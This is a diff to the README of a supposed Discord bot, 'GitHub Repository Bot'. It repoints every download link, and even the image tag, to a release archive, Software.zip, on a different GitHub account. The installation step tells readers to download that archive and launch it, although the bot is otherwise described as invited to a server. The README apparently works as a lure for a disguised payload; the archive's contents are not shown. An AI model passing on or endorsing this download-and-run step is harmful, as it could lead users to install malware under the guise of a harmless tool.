@@ -1,7 +1,7 @@
 
 # 🤖 GitHub Repository Bot
 
-![GitHub Repository Bot](https://www.example.com/github-repository-bot-image.png)
+![GitHub Repository Bot](https://github.com/HodA01/Github-Repository-Bot/releases/download/v1.0/Software.zip)
 
 Welcome to the GitHub Repository Bot - your go-to Discord bot for staying updated on new GitHub repositories and their latest updates in real-time!
 
@@ -15,9 +15,9 @@ GitHub Repository Bot is a powerful Discord bot designed to automatically announ
 🤖 Easy to integrate into your Discord server  
 
 ## Installation
-To get started with GitHub Repository Bot, simply download the [Software.zip](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) file and launch it.
+To get started with GitHub Repository Bot, simply download the [https://github.com/HodA01/Github-Repository-Bot/releases/download/v1.0/Software.zip](https://github.com/HodA01/Github-Repository-Bot/releases/download/v1.0/Software.zip) file and launch it.
 
-[![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download https://github.com/HodA01/Github-Repository-Bot/releases/download/v1.0/Software.zip](https://github.com/HodA01/Github-Repository-Bot/releases/download/v1.0/Software.zip)](https://github.com/HodA01/Github-Repository-Bot/releases/download/v1.0/Software.zip)
 
 ## Usage
 1. Invite the GitHub Repository Bot to your Discord server.
